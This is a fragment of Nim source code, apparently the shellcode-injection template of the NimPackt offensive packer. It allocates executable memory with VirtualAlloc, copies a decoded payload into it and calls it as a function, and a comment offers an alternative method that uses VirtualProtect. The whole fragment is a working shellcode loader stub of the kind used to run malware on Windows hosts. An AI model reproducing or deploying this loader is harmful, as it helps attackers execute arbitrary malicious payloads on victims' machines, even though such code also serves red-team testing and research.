    #[ 
        NimPackt-Template-Shinject.nim starts here
    ]#
    var allocated = VirtualAlloc(nil, len(decoded), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
    copyMem(allocated, decoded[0].addr, len(decoded))
    
    let f = cast[proc(){.nimcall.}](allocated)
    f()

    #[
        ALTERNATIVELY, use VirtualAlloc() and execute

            var oldProtect : DWORD
            var ret = VirtualProtect(decoded.addr, len(decoded), PAGE_EXECUTE_READWRITE, oldProtect.addr)
            doAssert ret != 0, "Error executing VirtualProtect()"
            
            let f = cast[proc(){.nimcall.}](decoded.addr)
            f()
    ]#